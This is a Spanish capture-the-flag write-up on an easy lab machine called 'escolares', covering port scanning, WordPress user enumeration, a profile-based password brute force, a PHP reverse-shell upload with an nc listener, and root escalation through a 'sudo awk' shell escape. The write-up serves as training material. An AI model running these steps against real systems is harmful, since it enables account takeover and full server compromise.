# Máquina escolares

---

Difucultad -> Fácil

---

Empezamos como siempre viendo puertos abbiertos con nmap

```shell
nmap -p- --open -sVC --min-rate=5000 -n -Pn 172.17.0.2
```

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 42:24:24:f5:66:68:a4:ad:8e:24:0d:70:4a:a5:e3:4f (ECDSA)
|_  256 29:42:2e:b6:85:ae:fb:09:89:8d:b9:c1:dc:4d:fc:1e (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: P\xC3\xA1gina Escolar Universitaria
```

Vemos los puertos 80 y 22 asi que miro la página web

![](assets/2025-11-12-15-03-28-image.png)

Vemos una página de una universidad, antes de nada hago fuzzing con gobuster

```shell
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,txt,php,html -t 64
```

```shell
/info.php             (Status: 200) [Size: 87159]
/assets               (Status: 301) [Size: 309] [--> http://172.17.0.2/assets/]
/wordpress            (Status: 301) [Size: 312] [--> http://172.17.0.2/wordpress/]
/index.html           (Status: 200) [Size: 6738]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/contacto.html        (Status: 200) [Size: 3210]
/phpmyadmin           (Status: 301) [Size: 313] [--> http://172.17.0.2/phpmyadmin/]
```

Encuentro varios directorios donde se puede ver que hay un wordpress asi que lo escaneo con `wpscan` para ver si hay temas o plugins vulnerables y listar usuarios

```shell
wpscan -e p,vt,cb,u --url 172.17.0.2/wordpress
```

![](assets/2025-11-12-15-09-59-image.png)

No encuentra plugin o temas pero encuentra el usuario luisillo, pruebo ha hacer un bruteforce con rockyou pero no encuentra nada

```shell
wpscan -U luisillo -P /usr/share/wordlists/rockyou.txt --url 172.17.0.2/wordpress
```

Buscando un poco veo que en `/profesores.html` sale un tal Luis (admin wodrpress) con información sobre él

![](assets/2025-11-12-15-13-54-image.png)

Viendo esto y sabiendo su usuario, creo una wordlist con los datos de Luis usando **`cupp -i`** 

![](assets/2025-11-12-15-16-28-image.png)

Teniendo esta wordlist con datos de Luis, vuelvo a hacer el bruteforce con esta wordlist

```shell
wpscan -U luisillo -P luis.txt --url 172.17.0.2/wordpress
```

![](assets/2025-11-12-15-18-52-image.png)

Y vemos que encuentra la contraseña `Luis1981` 

Con estas credenciales podemos acceder en http://escolared.dl/wordpress/wp-login.php (añadiendo `escolares.dl` a /etc/hosts)

![](assets/2025-11-12-15-35-48-image.png)

Una vez dentro del panel de administracción de wordpress podemos irnos a WP File Manager y subir una revshell.php de [revshells](https://www.revshells.com/) 

![](assets/2025-11-12-15-39-48-image.png)

![](assets/2025-11-12-15-40-12-image.png)

Una vez subida, vamos a http://escolares.dl/wordpress/shell.php mientras escuchamos en nuestra máquina con `nc -lvnp 4444`

![](assets/2025-11-12-15-41-07-image.png)

Y estamos dentro, antes de nada, hazemos [Tratamiento de la TTY](https://invertebr4do.github.io/tratamiento-de-tty/#) para operar con facilidad y un `sudo -l`

![](assets/2025-11-12-15-42-56-image.png)

Vemos que con sudo -l nos pide contraseña 

![](assets/2025-11-12-15-44-18-image.png)

Y buscando con permisos de SUID tampoco encuentro nada interesante.

Buscando un poco enceuntro en /home un txt con la contraseña de luisillo

![](assets/2025-11-12-15-45-24-image.png)

Con esto hacemos `su luisillo`y escalamos a este.

Como luisillo, vuelvo ha hacer un `sudo -l` y encuentro un binario

![](assets/2025-11-12-15-46-53-image.png)

Busco en [GTFOBins](https://gtfobins.github.io/gtfobins/awk/#sudo) y veo que con solo `sudo awk 'BEGIN {system("/bin/bash")}'` y consigo root, lo ejecuto

![](assets/2025-11-12-15-48-01-image.png)

Y asi de fácil conseguimos root :)
